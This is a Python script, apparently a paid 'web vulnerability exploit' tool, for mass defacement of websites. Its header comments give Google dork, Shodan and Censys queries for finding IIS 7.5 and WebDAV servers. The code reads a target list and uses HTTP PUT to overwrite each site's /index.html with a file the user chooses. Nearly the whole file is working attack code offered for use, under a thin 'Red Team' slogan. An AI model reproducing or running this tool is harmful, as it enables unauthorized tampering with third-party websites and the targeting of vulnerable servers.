#-*- coding: utf-8 -*-
# Google dork possible: intitle:"Index of" intext:"webdav"
#shodan: port:80,443 401 Authorization required "Server: Microsoft-IIS/7.5" "WWW-Authenticate: Basic realm=\"*\""
#censys: 443.https.get.headers.server.raw:"Microsoft-IIS/7.5" and 200.http.get.headers.www_authenticate.q:"Basic realm=\"*\""

try:
   import os
   import sys
   import time
   import random
   import os.path
   import requests
   import threading
except ImportError:
   exit("install requests and try again ...(pip install requests")
os.system("git pull")
os.system("clear")
red    = "\033[31m"
blue   = "\033[34m"
bold   = "\033[1m"
reset  = "\033[0m"
green  = "\033[32m"
yellow = "\033[33m"
colors = [
    "\033[38;5;226m",
    "\033[38;5;227m",
    "\033[38;5;229m",
    "\033[38;5;230m",
    "\033[38;5;190m",
    "\033[38;5;191m",
    "\033[38;5;220m",
    "\033[38;5;221m",
    "\033[38;5;142m",
    "\033[38;5;214m",
]
color1, color2, color3, color4, color5 = random.sample(colors, 5)
banner = f"""
\033[36m
//////////////////////////////////////////////////////////////////////////////
//     _______________    __  ___   _____       __  __    ______           //
//    /_  __/ ____/   |  /  |/  /  / ___/      / / / /   /_  __/          //
//     / / / __/ / /| | / /|_/ /   \__ \______/ /_/ /_____/ /            //
//    / / / /___/ ___ |/ /  / /   ___/ /_____/ __  /_____/ /            //
//   /_/ /_____/_/  |_/_/  /_/   /____/     /_/ /_/     /_/            //
//  Telegram  : @SHT7669          Web vulnerability exploit           //
//  Developer : RM Rony Ali         Tools Type: PAID  Version: 0.2   //
//////////////////////////////////////////////////////////////////////

"""+reset+blue
def animate():
    text = "Uploading your script to websites..."
    while True:
        for i in range(len(text)):
            print(text[:i] + "_" + text[i+1:], end="\r")
            time.sleep(0.1)
def eagle(tetew):
   ipt = ''
   if sys.version_info.major > 2:
      ipt = input(tetew)
   else:
      ipt = raw_input(tetew)   
   return str(ipt)
def white(script, target_file="targets.txt"):
    op = open(script, "r").read()
    with open(target_file, "r") as target:
        target = target.readlines()
        s = requests.Session()
        print(" ")
        print(green+bold+"[✓]\033[0m \033[34mUploading your script to %d website...." % (len(target)), end="", flush=True)
        print(" ")
	# start the animation thread
        t = threading.Thread(target=animate)
        t.daemon = True  # allow the thread to be killed when the main program ends
        t.start()                
        for web in target:
            try:
                site = web.strip()
                if site.startswith("http://") is False:
                    site = "http://" + site
                req = s.put(site + "/index.html", data=op)
                if req.status_code < 200 or req.status_code >= 250:
                    print(red + "[" + bold + " FAILED TO UPLOAD !\033[0m     " + red + " ] %s/%s" % (site, script))
                else:
                    print(green + "[" + bold + " SUCCESSFULLY UPLOADED ✓\033[0m" + green + " ] %s/%s" % (site, script))
            except requests.exceptions.RequestException:
                continue
            except KeyboardInterrupt:
                print;
                exit()
def main(__bn__):
   print(__bn__)
   while True:
      try:
         print(green+'[              Red Team :- We Hack To Defend The Digital World                ]'+reset+blue)
         print(' ')
         a = eagle(green+"[+]\033[0m \033[34mFuck Your System  \033[33m[example: index.html]\033[0m \033[34m> ")
         if not os.path.isfile(a):
            print(' ')
            print(red+bold+"	file '%s' not found in this folder !"%(a))
            print(" ")
            continue
         else:
            break
      except KeyboardInterrupt:
         print; exit()
   white(a)
if __name__ == "__main__":
    main(banner)
